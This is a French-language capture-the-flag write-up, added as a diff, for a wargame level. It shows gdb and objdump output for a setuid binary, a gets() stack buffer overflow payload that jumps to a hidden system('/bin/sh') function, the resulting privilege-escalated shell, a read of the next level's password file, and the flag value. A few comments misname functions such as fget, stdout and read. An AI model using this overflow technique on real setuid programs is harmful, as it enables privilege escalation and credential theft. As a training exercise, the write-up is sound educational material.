@@ -1,0 +1,66 @@
+Au level1, on a un binaire qui semble lire dans l'entree standard.
+On peux voir qu'il a les droits de level2, ce qui devrait nous permettre d'executer du code avec ses droits.
+
+Jetons un oeil au code avec gdb:
+
+$> gdb level1
+disass main
+Dump of assembler code for function main:
+   0x08048480 <+0>:	push   %ebp
+   0x08048481 <+1>:	mov    %esp,%ebp
+   0x08048483 <+3>:	and    $0xfffffff0,%esp
+   0x08048486 <+6>:	sub    $0x50,%esp					<-	allocation de 80 sur la stack
+   0x08048489 <+9>:	lea    0x10(%esp),%eax				<-	buff[76]
+   0x0804848d <+13>:	mov    %eax,(%esp)				
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>		<-	fget(buff)
+   0x08048495 <+21>:	leave
+   0x08048496 <+22>:	ret
+End of assembler dump.
+
+On peux voir que le programme ne fait rien de special si ce n'est de faire un appel a gets qui lit dans stdout.
+Il est possible d'exploiter gets en faisant un overflow du buffer (qui est ici de 76) afin de modifier la valeur du jmp de gets. Verifions si il y a une fonction non appellee avec objdump:
+
+$> objdump -S level1
+[...]
+08048444 <run>:
+ 8048444:	55                   	push   %ebp
+ 8048445:	89 e5                	mov    %esp,%ebp
+ 8048447:	83 ec 18             	sub    $0x18,%esp
+ 804844a:	a1 c0 97 04 08       	mov    0x80497c0,%eax
+ 804844f:	89 c2                	mov    %eax,%edx
+ 8048451:	b8 70 85 04 08       	mov    $0x8048570,%eax
+ 8048456:	89 54 24 0c          	mov    %edx,0xc(%esp)
+ 804845a:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
+ 8048461:	00
+ 8048462:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
+ 8048469:	00
+ 804846a:	89 04 24             	mov    %eax,(%esp)
+ 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt> <- fwrite("Good... Wait what?\n", 1, 19, stdout)
+ 8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
+ 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt> <- system("/bin/sh")
+ 804847e:	c9                   	leave
+ 804847f:	c3                   	ret
+[...]
+
+Effectivement, on voit qu'une fonction faisant un fwrite suivi d'un "/bin/sh" existe mais n'est pas appelee. La solution de l'overflow de gets est donc la bonne.
+
+On peux voir que l'adresse de run est 08048444, je vais donc preparer un petit exploit:
+
+$> echo -e -n 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08' > /Ressources/exploit
+
+Ensuite on envoi l'exploit sur la vm via scp:
+
+$> scp -P 4242 Ressources/exploit level1@192.168.59.121:/tmp/exploit
+
+L'overflow du buffer va venir modifier la valeur du jmp qui suit l'appel a read. De ce fait, au lieu de rejump sur main a la fin de gets, on va maintenant jmp sur run.
+Afin d'eviter que le programme segfault directement, on va utiliser 'cat -' afin qu'il lise dans l'entree standard.
+
+$> cat /tmp/exploit - | ./level1
+
+Good... Wait what?
+whoami
+level2
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+Ca y est, l'appel systeme "/bin/sh" a bien eu lieu et nous pouvons maintenant aller chercher .pass
